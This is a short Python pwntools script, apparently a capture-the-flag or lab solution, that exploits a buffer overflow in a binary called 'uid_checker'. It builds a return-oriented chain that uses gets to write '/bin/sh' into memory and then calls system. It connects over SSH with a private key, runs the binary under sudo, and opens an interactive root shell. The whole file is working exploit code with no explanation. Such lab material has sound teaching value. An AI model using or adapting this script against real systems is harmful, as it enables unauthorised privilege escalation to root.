#!/usr/bin/env python

from pwn import * 

context(os="linux", arch="amd64")
e = ELF('uid_checker')
context.binary = e 
#p = e.process()
junk = b"A"*88

pltsytem = p64(0x401040)
pltgets = p64(0x4005b0)
data = p64(0x601050)
poprdi = p64(0x400803) #0x0000000000400803: pop rdi; ret; 
binsh = b"/bin/sh\x00"
payload = junk + poprdi + data + pltgets + poprdi + data + pltsytem

sshconnection = ssh(host='10.10.76.185', user='dave', keyfile='/home/user/.ssh/id_rsa')
p = sshconnection.process(['sudo','/uid_checker'])
print(p.recvline())
p.sendline(payload)
print(p.recv())
p.sendline(binsh)
p.interactive(prompt='')
